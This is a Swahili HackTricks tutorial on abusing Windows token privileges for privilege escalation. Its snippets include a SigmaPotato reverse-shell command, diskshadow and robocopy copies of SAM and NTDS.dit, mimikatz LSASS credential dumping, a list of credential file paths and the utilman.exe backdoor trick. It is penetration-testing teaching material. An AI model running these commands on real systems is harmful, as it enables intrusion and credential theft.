# Kutumia vibaya Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Ikiwa **hujui Windows Access Tokens ni nini**, soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Huenda ukaweza kuongeza privileges kwa kutumia vibaya tokens ambazo tayari unazo.**

### SeImpersonatePrivilege

Privilege hii huruhusu process kuiga (lakini si kuunda) token inapoweza kupata handle ya token hiyo. Token yenye privileges inaweza kupatikana kutoka kwa Windows service (DCOM) kwa kuishawishi ifanye NTLM authentication dhidi ya exploit, na hivyo kuwezesha kuendesha process yenye SYSTEM privileges.<sup>[[2]](#references)</sup> Mbinu hii inaweza kutumiwa kwa kutumia tools kama [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (inayohitaji WinRM izimwe), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Web application inayopatikana kupitia loopback pekee inaweza kuwa njia tofauti ya kuchunguza coercion ikiwa mtumiaji wa ndani anaweza kufikia endpoint iliyothibitishwa ambayo hutuma request kwa URL iliyochaguliwa na caller, chini ya utambulisho wenye privileges zaidi. Kagua authorization na vizuizi vya URL vya endpoint, utambulisho halisi wa outbound client na tabia yake ya authentication, na ikiwa client huyo anaweza kufikia listener inayodhibitiwa na mtumiaji mwenye privileges chache. `SeImpersonatePrivilege` ikiwa enabled, IIS listener, au parameter ya kuchukua URL pekee haithibitishi kuwepo kwa token yenye privileges au njia ya escalation. Fanya ukaguzi huu bila kuanzisha vitendo; usitume requests za coercion wakati wa enumeration. Tazama nyaraka za Microsoft kuhusu [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) na [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Vidokezo vya kisasa kwa operators:

- **JuicyPotato imepitwa na wakati**: kwenye Windows 10 1809+/Server 2019+, pendelea **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer**, kutegemea RPC/COM surface ambazo bado zinaweza kufikiwa.
- Ikiwa umeathiri service inayotumia akaunti ya **`LOCAL SERVICE`** au **`NETWORK SERVICE`** na `whoami /priv` inaonyesha **filtered token** isiyo na `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, rejesha kwanza **default privilege set** ya akaunti hiyo (kwa mfano kwa kutumia **FullPowers**) kisha ujaribu tena potato family.<sup>[[3]](#references)</sup>
- Baadhi ya forks mpya ni rahisi zaidi kutumia kuliko tools asili. Kwa mfano, **SigmaPotato** huongeza reflection/in-memory execution na uoanifu na matoleo ya kisasa ya Windows, ilhali **PrintNotifyPotato** hutumia vibaya PrintNotify COM service na mara nyingi hufaa pale njia ya kawaida ya Spooler ikiwa imezimwa.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Inafanana sana na **SeImpersonatePrivilege**; hutumia **mbinu ileile** kupata token yenye upendeleo.\
Kisha, ruhusa hii huruhusu **kukabidhi token ya msingi** kwa mchakato mpya/uliosimamishwa. Ukiwa na token ya uigaji yenye upendeleo, unaweza kutengeneza token ya msingi (DuplicateTokenEx).\
Ukiwa na token hiyo, unaweza kuunda **mchakato mpya** kwa kutumia 'CreateProcessAsUser', au kuunda mchakato uliosimamishwa na **kuweka token** (kwa kawaida, huwezi kurekebisha token ya msingi ya mchakato unaoendelea).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ukiwa umewasha token hii, unaweza kutumia **KERB_S4U_LOGON** kupata **token ya uigaji** ya mtumiaji mwingine yeyote bila kujua vitambulisho vyake, **kuongeza kikundi chochote** (admins) kwenye token, kuweka **kiwango cha uadilifu** cha token kuwa "**medium**", na kukabidhi token hii kwa **thread ya sasa** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ruhusa hii husababisha mfumo **kuruhusu ufikiaji wote wa kusoma** faili yoyote (kwa shughuli za kusoma pekee). Hutumika **kusoma password hashes za akaunti za Administrator wa ndani** kutoka kwenye registry; baada ya hapo, zana kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa pamoja na hash hiyo (mbinu ya Pass-the-Hash). Hata hivyo, mbinu hii haifanyi kazi katika hali mbili: akaunti ya Local Administrator ikiwa imezimwa, au sera ikiondoa haki za kiutawala kwa Local Administrators wanaounganisha kwa mbali.<sup>[[2]](#references)</sup>\
Kwa vitendo, utaratibu wa ndani unaotegemewa zaidi kwa kawaida ni **VSS + `robocopy /b`**: tengeneza/fichua nakala ya shadow, kisha nakili `SAM`/`SYSTEM` au `NTDS.dit` katika **hali ya backup**, ambayo hupita ACL za faili.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Unaweza **kutumia vibaya privilege hii** kwa:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kufuata **IppSec** kwenye [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **kuongeza privileges kwa kutumia Backup Operators** ya:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Privilege hii hutoa ruhusa ya **kuandika** kwenye faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili hiyo. Hufungua uwezekano mwingi wa privilege escalation, ikiwemo uwezo wa **kurekebisha services**, kutekeleza DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options, pamoja na mbinu nyingine.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni ruhusa yenye nguvu, inayofaa hasa mtumiaji anapoweza kuiga tokens, lakini pia inaweza kutumika bila SeImpersonatePrivilege. Uwezo huu hutegemea kuweza kuiga token inayomwakilisha mtumiaji huyo huyo na ambayo kiwango chake cha integrity hakizidi cha process ya sasa.<sup>[[2]](#references)</sup>

**Mambo Muhimu:**

- **Kuiga bila SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kwa EoP kwa kuiga tokens chini ya masharti maalum.
- **Masharti ya kuiga Token:** Ili kuiga token kwa mafanikio, lazima iwe ya mtumiaji huyo huyo na kiwango chake cha integrity kiwe sawa na au chini ya kiwango cha integrity cha process inayojaribu kuiiga.
- **Kuunda na Kurekebisha Tokens za Kuiga:** Watumiaji wanaweza kuunda token ya kuiga na kuiboresha kwa kuongeza SID (Security Identifier) ya kundi lenye privileges.

### SeLoadDriverPrivilege

Privilege hii huruhusu process **kupakia na kupakua device drivers** kwa kuunda ingizo la registry lenye thamani maalum za `ImagePath` na `Type`. Kwa kuwa uwezo wa kuandika moja kwa moja kwenye `HKLM` (HKEY_LOCAL_MACHINE) umezuiwa, `HKCU` (HKEY_CURRENT_USER) inaweza kutumika badala yake. Hata hivyo, njia mahususi inahitajika ili kernel itambue ingizo la `HKCU` kama usanidi wa driver.<sup>[[2]](#references)</sup>

Matumizi ya kisasa ya offensive kwa kawaida ni **BYOVD** (bring your own vulnerable driver): pakia kernel driver **iliyotiwa saini lakini yenye udhaifu**, kisha tumia IOCTL zake kuzima protections au kufikia utekelezaji wa msimbo wa kernel. Kumbuka kwamba kwenye builds za hivi karibuni za Windows 11/Server, **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huzuia chains za zamani zilizochapishwa hadharani, kwa hiyo mifano ya zamani ya aina ya `szkg64.sys` si ya kutegemewa kila mahali tena.

Njia hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya mtumiaji wa sasa. Ndani ya `HKCU`, njia hii yote lazima iundwe, na thamani mbili ziwekwe:<sup>[[2]](#references)</sup>

- `ImagePath`, ambayo ni njia ya binary itakayotekelezwa
- `Type`, yenye thamani ya `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Hatua za Kufuata:**

1. Tumia `HKCU` badala ya `HKLM` kwa sababu uwezo wa kuandika umezuiwa.
2. Unda njia `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya mtumiaji wa sasa.
3. Weka `ImagePath` kuwa njia ya utekelezaji wa binary.
4. Weka `Type` kuwa `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Njia zaidi za kutumia vibaya haki hii katika [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii inafanana na **SeRestorePrivilege**. Kazi yake kuu huruhusu mchakato **kumiliki object**, na hivyo kukwepa hitaji la ufikiaji wa hiari ulioidhinishwa waziwazi kwa kutoa haki za ufikiaji za WRITE_OWNER. Mchakato huu huhusisha kwanza kupata umiliki wa registry key inayolengwa kwa madhumuni ya kuandika, kisha kurekebisha DACL ili kuwezesha shughuli za kuandika.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Ruhusa hii inaruhusu **kudebug michakato mingine**, ikiwemo kusoma na kuandika kwenye kumbukumbu. Mikakati mbalimbali ya memory injection, inayoweza kukwepa suluhu nyingi za antivirus na host intrusion prevention, inaweza kutumika kwa ruhusa hii.<sup>[[2]](#references)</sup>

Kwenye Windows za kisasa, kumbuka kwamba `SeDebugPrivilege` kwa kawaida inatosha kufungua **michakato ya SYSTEM isiyolindwa** na kunakili token zake, lakini **haikuhakikishii** kuwa unaweza kufikia **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewashwa, michakato isiyolindwa haiwezi kusoma kutoka au kuingiza msimbo ndani ya LSASS, hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, iba token kutoka kwa mchakato mwingine wa SYSTEM usio wa PPL, au unganisha na PPL bypass/BYOVD badala ya kudhani kuwa `procdump` itafanya kazi. Kwa mfano kamili wa kunakili token kwa kutumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [ukurasa huu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka kwenye [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **kunasa kumbukumbu ya mchakato**. Hasa, hii inaweza kutumika kwa mchakato wa **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambao una jukumu la kuhifadhi vitambulisho vya mtumiaji baada ya mtumiaji kuingia kwenye mfumo kwa mafanikio.

Kisha unaweza kupakia dump hii kwenye mimikatz ili kupata nywila:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Dump ya LSASS iliyohifadhiwa awali na inayosomeka inaweza kupatikana hata kama akaunti ya sasa haina ruhusa ya kunasa mchakato hai uliolindwa. Chukulia faili la dump au archive lenye jina linalofanana kama kidokezo tu: hakikisha una ufikiaji na uthibitishe maudhui yake, kisha tathmini kama credential yoyote iliyopatikana bado ni halali na inatoa mazingira yenye privilege ya juu zaidi. Majina ya faili pekee hayathibitishi kwamba archive ina dump au kwamba credentials zinaweza kutumika tena.

#### RCE

Ukitaka kupata shell ya `NT SYSTEM`, unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Haki hii (Kutekeleza kazi za matengenezo ya volume) inaweza kuwezesha shughuli za volume zinazohitaji ruhusa za juu, lakini yenyewe haihakikishi kupata handle inayoweza kusomeka ya raw-volume au ufikiaji wa faili zozote. ACL za kifaa, hali ya token, toleo la Windows na operesheni inayoombwa bado ni muhimu. Operesheni ya udhibiti wa volume inayoruhusiwa inaweza badala yake kubadilisha ACL za mfumo wa faili; hiyo ni operesheni inayobadilisha hali na huenda ikaathiri volume nzima. Kwenye host ya CA, kutumia vibaya vyeti pia kunahitaji ufikiaji wa nyenzo zinazotumika za private key, na faili zinazolindwa na EFS bado zinahitaji ufunguo ulioidhinishwa wa usimbuaji au urejeshaji. Tazama masharti ya kina hapa chini.<sup>[[5]](#references)</sup>

Tazama mbinu na hatua za kupunguza hatari kwa kina:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Angalia ruhusa

```
whoami /priv
```

The **tokens zinazoonekana kama Disabled** kwa kawaida zinaweza kuwashwa, kwa hivyo mara nyingi unaweza kutumia vibaya privileges za _Enabled_ na _Disabled_.

### Washa tokens zote

Ikiwa una privileges zilizozimwa, unaweza kutumia script ya [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) kuwasha tokens zote:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Au **script** iliyopachikwa kwenye [**chapisho**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Jedwali

Orodha kamili ya token privileges inapatikana kwenye [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); muhtasari ulio hapa chini utaorodhesha tu njia za moja kwa moja za kutumia privilege kupata session ya admin au kusoma faili nyeti.<sup>[[1]](#references)</sup>

| Privilege                  | Athari      | Zana                    | Njia ya utekelezaji                                                                                                                                                                                                                                                                                                                                     | Maelezo                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | Zana ya mtu mwingine     | _"Ingemwezesha mtumiaji kuiga tokens na kupandisha privilege hadi nt system kwa kutumia zana kama potato.exe, rottenpotato.exe na juicypotato.exe"_                                                                                                                                                                                                      | Asante [Aurélien Chalot](https://twitter.com/Defte_) kwa sasisho. Nitajaribu kulieleza upya kwa mtindo unaofanana zaidi na mapishi hivi karibuni.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tishio**  | _**Amri zilizojengewa ndani**_ | Soma faili nyeti kwa `robocopy /b` au zana maalum za kunakili zinazotambua SeBackup.                                                                                                                                                                                                                                                                 | <p>- Inafaa sana kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi kutumia, lakini cmdlets/APIs maalum za SeBackup mara nyingi zina unyumbufu zaidi kwa faili zilizofungwa/wazi.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | Zana ya mtu mwingine     | Unda token yoyote, ikiwemo yenye haki za local admin, kwa kutumia `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Nakili token ya SYSTEM isiyo **PPL** au dump memory kutoka kwa mchakato usiolindwa.                                                                                                                                                                                                                                                                 | <p>Dump ya LSASS huzuiwa mara nyingi ikiwa RunAsPPL/LSA Protection imewashwa.</p><p>Script inapatikana kwenye [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | Zana ya mtu mwingine     | Tumia **familia ya Potato** / uigaji kupitia named-pipe kuzindua SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, n.k.).                                                                                                                                                                                    | <p>Njia hii inafaa zaidi kwa akaunti za huduma kama IIS APPPOOL, MSSQL, scheduled tasks, au mazingira yoyote ambayo tayari yana `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | Zana ya mtu mwingine     | <p>1. Pakia kernel driver iliyosainiwa lakini yenye udhaifu (BYOVD)<br>2. Tumia IOCTL za driver kupata kernel R/W, kuzima zana za usalama, au kupandisha privilege hadi SYSTEM<br><br>Vinginevyo, privilege hii inaweza kutumika kuondoa drivers zinazohusiana na usalama kwa amri iliyojengewa ndani ya <code>fltMC</code>, kwa mfano <code>fltMC sysmondrv</code></p>                     | <p>Drivers za zamani zilizowekwa wazi, kama <code>szkg64.sys</code>, zinazuiwa zaidi kwenye Windows za kisasa na orodha ya drivers zilizo hatarishi / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Fungua PowerShell/ISE huku privilege ya SeRestore ikiwa ipo.<br>2. Washa privilege kwa kutumia <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Badilisha jina la utilman.exe kuwa utilman.old<br>4. Badilisha jina la cmd.exe kuwa utilman.exe<br>5. Funga console kisha ubonyeze Win+U</p> | <p>Baadhi ya programu za AV zinaweza kugundua shambulio hili.</p><p>Njia mbadala hutegemea kubadilisha binaries za huduma zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Amri zilizojengewa ndani**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Badilisha jina la cmd.exe kuwa utilman.exe<br>4. Funga console kisha ubonyeze Win+U</p>                                                                                                                                       | <p>Baadhi ya programu za AV zinaweza kugundua shambulio hili.</p><p>Njia mbadala hutegemea kubadilisha binaries za huduma zilizohifadhiwa kwenye "Program Files" kwa kutumia privilege hiyo hiyo.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | Zana ya mtu mwingine     | <p>Badilisha tokens ili zijumuishe haki za local admin. Huenda ikahitaji SeImpersonate.</p><p>Inahitaji kuthibitishwa.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - njia za kutumia Windows privileges kufikia admin](https://github.com/gtworek/Priv2Admin)
- [2] [Kutumia Token Privileges vibaya kwa LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Nirudishieni Privileges Zangu! Tafadhali?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (hali ya backup `/b` hupita ukaguzi wa ACL za faili/folda)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Tekeleza kazi za matengenezo ya volume (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → uchotaji wa CA key → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
